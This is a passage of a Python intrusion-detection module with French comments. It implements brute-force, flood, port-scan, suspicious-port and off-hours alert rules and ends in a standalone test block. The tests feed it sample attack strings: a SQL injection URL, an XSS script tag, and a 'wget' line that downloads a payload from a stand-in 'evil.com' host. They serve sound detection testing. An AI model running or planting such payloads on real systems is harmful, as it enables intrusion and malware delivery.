                    "mitre_technique_name": rule.get("mitre_technique_name", ""),
                }
                alerts.append(alert)

        return alerts

    # =========================================================================
    #  DÉTECTION COMPORTEMENTALE
    # =========================================================================

    def _check_behavioral_rules(self, log: Dict) -> List[Dict]:
        """
        Analyse les comportements suspects basés sur des seuils.
        
        Règles implémentées :
        - Brute Force IP : Si même IP échoue 5+ fois en 60 secondes → CRITICAL
        - Brute Force Agent : Si même agent a 5+ échecs en 60s (sans IP) → HIGH
        - Connection Flood : Si même IP source a 20+ connexions en 30s → HIGH
        
        Args:
            log : Log normalisé
        
        Returns:
            List[Dict] : Alertes comportementales
        """
        alerts = []
        message = log.get("message", "").lower()
        agent_id = log.get("agent_id", "unknown")
        timestamp = log.get("timestamp", datetime.now().isoformat())

        # ---- Détection d'échecs d'authentification ----
        is_auth_failure = any(keyword in message for keyword in [
            "failed", "failure", "invalid", "denied",
            "incorrect", "wrong password", "4625",
            "échec", "refusé", "rejeté"
        ])

        if not is_auth_failure:
            # --- Détection de flood de connexions (scan de ports) ---
            alerts.extend(self._check_connection_flood(log))
            return alerts

        # Extraire les IPs du message
        extracted_ips = log.get("extracted_ips", [])
        
        # Si pas d'IPs extraites, essayer d'en extraire du message
        if not extracted_ips:
            ip_pattern = re.compile(
                r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
                r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'
            )
            extracted_ips = ip_pattern.findall(log.get("message", ""))

        # Enregistrer la tentative pour chaque IP source
        threshold = self.config.get("brute_force_threshold", 5)
        window = self.config.get("brute_force_window_seconds", 60)
        now = datetime.now()

        ip_alert_fired = False
        for ip in extracted_ips:
            # Ignorer les IPs locales/loopback
            if ip in ("127.0.0.1", "0.0.0.0"):
                continue
                
            # Ajouter le timestamp courant
            self.failed_attempts[ip].append(now)

            # Nettoyer les entrées hors fenêtre
            cutoff = now - timedelta(seconds=window)
            self.failed_attempts[ip] = [
                ts for ts in self.failed_attempts[ip] if ts > cutoff
            ]

            # Vérifier si le seuil est atteint
            attempt_count = len(self.failed_attempts[ip])
            if attempt_count >= threshold:
                alert = {
                    "rule_name": "BRUTE_FORCE_IP",
                    "severity": "CRITICAL",
                    "type": "BRUTE_FORCE",
                    "message": (
                        f"Brute force détecté depuis {ip} — "
                        f"{attempt_count} tentatives en {window}s "
                        f"(seuil: {threshold})"
                    ),
                    "timestamp": timestamp,
                    "agent_id": agent_id,
                    "mitre_tactic": "Credential Access",
                    "mitre_technique_id": "T1110",
                    "mitre_technique_name": "Brute Force",
                }
                alerts.append(alert)
                ip_alert_fired = True
                
                # Reset le compteur après l'alerte pour éviter le spam
                self.failed_attempts[ip] = []

        # --- BRUTE FORCE par AGENT (pour Windows Event 4625 sans IP) ---
        # Si aucune IP trouvée dans le message, on traque par agent_id
        if not ip_alert_fired:
            self.agent_failures[agent_id].append(now)
            
            # Nettoyer
            cutoff = now - timedelta(seconds=window)
            self.agent_failures[agent_id] = [
                ts for ts in self.agent_failures[agent_id] if ts > cutoff
            ]
            
            attempt_count = len(self.agent_failures[agent_id])
            if attempt_count >= threshold:
                alert = {
                    "rule_name": "BRUTE_FORCE_AGENT",
                    "severity": "HIGH",
                    "type": "BRUTE_FORCE",
                    "message": (
                        f"Brute force détecté sur agent {agent_id} — "
                        f"{attempt_count} échecs d'authentification en {window}s "
                        f"(seuil: {threshold})"
                    ),
                    "timestamp": timestamp,
                    "agent_id": agent_id,
                    "mitre_tactic": "Credential Access",
                    "mitre_technique_id": "T1110",
                    "mitre_technique_name": "Brute Force",
                }
                alerts.append(alert)
                self.agent_failures[agent_id] = []

        # --- Aussi vérifier le flood de connexions ---
        alerts.extend(self._check_connection_flood(log))

        return alerts

    def _check_connection_flood(self, log: Dict) -> List[Dict]:
        """
        Détecte un flood de connexions réseau (indicateur de scan de ports ou DDoS).
        
        Détections :
        - Scan de ports : 15+ connexions en 30s depuis même IP
        - SYN Flood DDoS : 50+ SYN_SENT en 10s depuis même IP
        - Connexion massive : 30+ connexions en 10s (DDoS applicatif)
        
        Args:
            log : Log normalisé
        
        Returns:
            List[Dict] : Alertes
        """
        alerts = []
        message = log.get("message", "")
        source = log.get("source", "")
        agent_id = log.get("agent_id", "unknown")
        timestamp = log.get("timestamp", datetime.now().isoformat())
        
        # Ne traiter que les logs réseau
        if source != "network" and "ESTABLISHED" not in message and "SYN_SENT" not in message:
            return alerts
        
        # Extraire l'IP distante
        ip_pattern = re.compile(
            r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}'
            r'(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'
        )
        ips = ip_pattern.findall(message)
        
        now = datetime.now()
        flood_threshold = 15
        flood_window = 30  # secondes
        
        # Seuils DDoS (inspirés de l'IDS engine)
        syn_flood_threshold = self.config.get("ddos_syn_threshold", 50)
        syn_flood_window = 10  # secondes
        mass_conn_threshold = self.config.get("ddos_conn_threshold", 30)
        mass_conn_window = 10  # secondes
        
        is_syn = "SYN_SENT" in message or "syn" in message.lower()
        
        for ip in ips:
            if ip in ("127.0.0.1", "0.0.0.0"):
                continue

            # --- 1. Détection SYN Flood DDoS ---
            if is_syn:
                self.syn_flood_counts[ip].append(now)
                cutoff = now - timedelta(seconds=syn_flood_window)
                self.syn_flood_counts[ip] = [
                    ts for ts in self.syn_flood_counts[ip] if ts > cutoff
                ]
                syn_count = len(self.syn_flood_counts[ip])
                if syn_count >= syn_flood_threshold:
                    alert = {
                        "rule_name": "DDOS_SYN_FLOOD_BEHAVIORAL",
                        "severity": "CRITICAL",
                        "type": "DDOS",
                        "message": (
                            f"DDoS SYN Flood détecté depuis {ip} — "
                            f"{syn_count} SYN en {syn_flood_window}s "
                            f"(seuil: {syn_flood_threshold})"
                        ),
                        "timestamp": timestamp,
                        "agent_id": agent_id,
                        "mitre_tactic": "Impact",
                        "mitre_technique_id": "T1498",
                        "mitre_technique_name": "Network Denial of Service",
                    }
                    alerts.append(alert)
                    self.syn_flood_counts[ip] = []

            # --- 2. Détection flood de connexions (scan de ports) ---
            self.connection_counts[ip].append(now)
            
            cutoff = now - timedelta(seconds=flood_window)
            self.connection_counts[ip] = [
                ts for ts in self.connection_counts[ip] if ts > cutoff
            ]
            
            conn_count = len(self.connection_counts[ip])

            # Vérifier DDoS applicatif (masse de connexions rapides)
            cutoff_fast = now - timedelta(seconds=mass_conn_window)
            fast_conns = [ts for ts in self.connection_counts[ip] if ts > cutoff_fast]
            if len(fast_conns) >= mass_conn_threshold:
                alert = {
                    "rule_name": "DDOS_CONNECTION_FLOOD",
                    "severity": "CRITICAL",
                    "type": "DDOS",
                    "message": (
                        f"DDoS connexion flood depuis {ip} — "
                        f"{len(fast_conns)} connexions en {mass_conn_window}s "
                        f"(seuil: {mass_conn_threshold})"
                    ),
                    "timestamp": timestamp,
                    "agent_id": agent_id,
                    "mitre_tactic": "Impact",
                    "mitre_technique_id": "T1498",
                    "mitre_technique_name": "Network Denial of Service",
                }
                alerts.append(alert)
                self.connection_counts[ip] = []
            elif conn_count >= flood_threshold:
                # Scan de ports classique
                alert = {
                    "rule_name": "CONNECTION_FLOOD",
                    "severity": "HIGH",
                    "type": "PORT_SCAN",
                    "message": (
                        f"Flood de connexions depuis {ip} — "
                        f"{conn_count} connexions en {flood_window}s "
                        f"(possible scan de ports)"
                    ),
                    "timestamp": timestamp,
                    "agent_id": agent_id,
                    "mitre_tactic": "Discovery",
                    "mitre_technique_id": "T1046",
                    "mitre_technique_name": "Network Service Discovery",
                }
                alerts.append(alert)
                self.connection_counts[ip] = []
        
        return alerts

    # =========================================================================
    #  DÉTECTION CONTEXTUELLE
    # =========================================================================

    def _check_context_rules(self, log: Dict) -> List[Dict]:
        """
        Vérifie les règles basées sur le contexte (ports, horaires, etc.)
        
        Règles implémentées :
        - Connexions sur ports suspects (4444, 1337, 31337, etc.)
        - Connexions hors heures (00h-06h)
        
        Args:
            log : Log normalisé
        
        Returns:
            List[Dict] : Alertes contextuelles
        """
        alerts = []
        message = log.get("message", "")
        agent_id = log.get("agent_id", "unknown")
        timestamp = log.get("timestamp", datetime.now().isoformat())

        # --- Détection de ports suspects ---
        suspicious_ports = self.config.get("suspicious_ports", [4444, 1337, 31337, 6666, 9001])
        
        # Extraire les ports du message
        port_pattern = re.compile(r'port[= :]+(\d+)', re.IGNORECASE)
        port_matches = port_pattern.findall(message)
        
        # Aussi chercher des patterns comme :4444 ou →4444
        general_port_pattern = re.compile(r'[:→]\s*(\d{2,5})\b')
        port_matches.extend(general_port_pattern.findall(message))

        for port_str in port_matches:
            try:
                port = int(port_str)
                if port in suspicious_ports:
                    alert = {
                        "rule_name": "SUSPICIOUS_PORT",
                        "severity": "HIGH",
                        "type": "SUSPICIOUS_CONNECTION",
                        "message": (
                            f"Connexion sur port suspect {port} détectée | "
                            f"{message[:150]}"
                        ),
                        "timestamp": timestamp,
                        "agent_id": agent_id,
                        "mitre_tactic": "Command and Control",
                        "mitre_technique_id": "T1571",
                        "mitre_technique_name": "Non-Standard Port",
                    }
                    alerts.append(alert)
            except ValueError:
                continue

        # --- Détection hors heures (00h-06h) ---
        try:
            if "T" in timestamp:
                hour = int(timestamp.split("T")[1].split(":")[0])
            else:
                hour = datetime.now().hour

            # Vérifier si c'est entre minuit et 6h
            if 0 <= hour < 6:
                # Ne déclencher que pour les événements significatifs
                significant_keywords = [
                    "login", "logon", "connect", "ssh", "rdp",
                    "authentication", "access"
                ]
                msg_lower = message.lower()
                if any(kw in msg_lower for kw in significant_keywords):
                    alert = {
                        "rule_name": "OFF_HOURS_ACCESS",
                        "severity": "MEDIUM",
                        "type": "ANOMALY",
                        "message": (
                            f"Accès hors heures détecté à {hour:02d}h | "
                            f"{message[:150]}"
                        ),
                        "timestamp": timestamp,
                        "agent_id": agent_id,
                        "mitre_tactic": "Defense Evasion",
                        "mitre_technique_id": "T1036",
                        "mitre_technique_name": "Masquerading",
                    }
                    alerts.append(alert)

        except (ValueError, IndexError):
            pass

        return alerts

    # =========================================================================
    #  GESTION DES RÈGLES
    # =========================================================================

    def get_rules_summary(self) -> List[Dict]:
        """
        Retourne un résumé de toutes les règles actives.
        
        Returns:
            List[Dict] : [{name, severity, type, description}, ...]
        """
        return [
            {
                "name": rule["name"],
                "severity": rule["severity"],
                "type": rule["type"],
                "description": rule["description"]
            }
            for rule in self.rules
        ]

    def get_stats(self) -> Dict:
        """
        Retourne les statistiques du détecteur.
        
        Returns:
            Dict : {total_rules, tracked_ips, ...}
        """
        return {
            "total_rules": len(self.rules),
            "tracked_ips": len(self.failed_attempts),
            "brute_force_threshold": self.config.get("brute_force_threshold", 5),
            "suspicious_ports": self.config.get("suspicious_ports", []),
        }

    def cleanup_old_entries(self, max_age_seconds: int = 300):
        """
        Nettoie les anciennes entrées des compteurs comportementaux.
        À appeler périodiquement pour éviter les fuites mémoire.
        
        Args:
            max_age_seconds : Âge max des entrées en secondes (défaut: 5 min)
        """
        cutoff = datetime.now() - timedelta(seconds=max_age_seconds)

        # Nettoyer failed_attempts (par IP)
        for ip in list(self.failed_attempts.keys()):
            self.failed_attempts[ip] = [
                ts for ts in self.failed_attempts[ip] if ts > cutoff
            ]
            if not self.failed_attempts[ip]:
                del self.failed_attempts[ip]

        # Nettoyer agent_failures (par agent_id)
        for aid in list(self.agent_failures.keys()):
            self.agent_failures[aid] = [
                ts for ts in self.agent_failures[aid] if ts > cutoff
            ]
            if not self.agent_failures[aid]:
                del self.agent_failures[aid]

        # Nettoyer connection_counts (par IP)
        for ip in list(self.connection_counts.keys()):
            self.connection_counts[ip] = [
                ts for ts in self.connection_counts[ip] if ts > cutoff
            ]
            if not self.connection_counts[ip]:
                del self.connection_counts[ip]

        # Nettoyer syn_flood_counts (par IP)
        for ip in list(self.syn_flood_counts.keys()):
            self.syn_flood_counts[ip] = [
                ts for ts in self.syn_flood_counts[ip] if ts > cutoff
            ]
            if not self.syn_flood_counts[ip]:
                del self.syn_flood_counts[ip]

        # Nettoyer request_counts (par IP)
        for ip in list(self.request_counts.keys()):
            self.request_counts[ip] = [
                ts for ts in self.request_counts[ip] if ts > cutoff
            ]
            if not self.request_counts[ip]:
                del self.request_counts[ip]


# =============================================================================
#  POINT D'ENTRÉE — Test standalone
# =============================================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  SOC Detector — Test Standalone")
    print("=" * 60)

    detector = ThreatDetector()

    # Afficher les règles
    print(f"\n--- Règles actives ({len(detector.rules)}) ---")
    for rule in detector.get_rules_summary():
        print(f"  [{rule['severity']:8}] {rule['name']:25} — {rule['type']}")

    # Test 1 : SSH Brute Force
    print("\n--- Test 1 : SSH Brute Force ---")
    alerts = detector.analyze({
        "message": "Failed password for root from 10.0.0.5 port 22 ssh2",
        "agent_id": "SRV-LINUX-01",
        "timestamp": datetime.now().isoformat(),
        "level": "WARNING",
        "category": "AUTH",
        "extracted_ips": ["10.0.0.5"]
    })
    print(f"  Alertes déclenchées : {len(alerts)}")

    # Test 2 : SQL Injection
    print("\n--- Test 2 : SQL Injection ---")
    alerts = detector.analyze({
        "message": "GET /login?user=admin' UNION SELECT * FROM users-- HTTP/1.1",
        "agent_id": "WEB-SRV-01",
        "timestamp": datetime.now().isoformat(),
        "level": "WARNING",
        "category": "WEB",
        "extracted_ips": []
    })
    print(f"  Alertes déclenchées : {len(alerts)}")

    # Test 3 : XSS
    print("\n--- Test 3 : XSS ---")
    alerts = detector.analyze({
        "message": 'GET /search?q=<script>alert("xss")</script> HTTP/1.1',
        "agent_id": "WEB-SRV-01",
        "timestamp": datetime.now().isoformat(),
        "level": "WARNING",
        "category": "WEB",
        "extracted_ips": []
    })
    print(f"  Alertes déclenchées : {len(alerts)}")

    # Test 4 : Port suspect
    print("\n--- Test 4 : Port suspect ---")
    alerts = detector.analyze({
        "message": "Connexion ESTABLISHED: 192.168.1.5:54321 → 10.0.0.99:4444",
        "agent_id": "PC-SUSPECT",
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "category": "NETWORK",
        "extracted_ips": ["192.168.1.5", "10.0.0.99"]
    })
    print(f"  Alertes déclenchées : {len(alerts)}")

    # Test 5 : Brute force comportemental (5 tentatives rapides)
    print("\n--- Test 5 : Brute Force comportemental ---")
    for i in range(6):
        alerts = detector.analyze({
            "message": f"Failed password for admin from 172.16.0.50 port 22 ssh2",
            "agent_id": "SRV-LINUX-01",
            "timestamp": datetime.now().isoformat(),
            "level": "WARNING",
            "category": "AUTH",
            "extracted_ips": ["172.16.0.50"]
        })
    print(f"  Alerte BRUTE_FORCE_IP déclenchée : "
          f"{'OUI' if any(a['rule_name'] == 'BRUTE_FORCE_IP' for a in alerts) else 'NON'}")

    # Test 6 : Malware download
    print("\n--- Test 6 : Malware download ---")
    alerts = detector.analyze({
        "message": "wget http://evil.com/payload.sh -O /tmp/payload.sh",
        "agent_id": "SRV-COMPROMISED",
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "category": "SYSTEM",
        "extracted_ips": []
    })
    print(f"  Alertes déclenchées : {len(alerts)}")

    # Test 7 : Log normal (aucune alerte)
    print("\n--- Test 7 : Log normal (pas d'alerte) ---")
    alerts = detector.analyze({
        "message": "Service nginx started successfully",
        "agent_id": "WEB-SRV-01",
        "timestamp": datetime.now().isoformat(),
        "level": "INFO",
        "category": "SYSTEM",
        "extracted_ips": []
    })
    print(f"  Alertes déclenchées : {len(alerts)} (attendu: 0)")

    print("\n  Stats détecteur :", detector.get_stats())

    print("\n" + "=" * 60)
    print("  ✅ Tests detector terminés avec succès !")
    print("=" * 60)
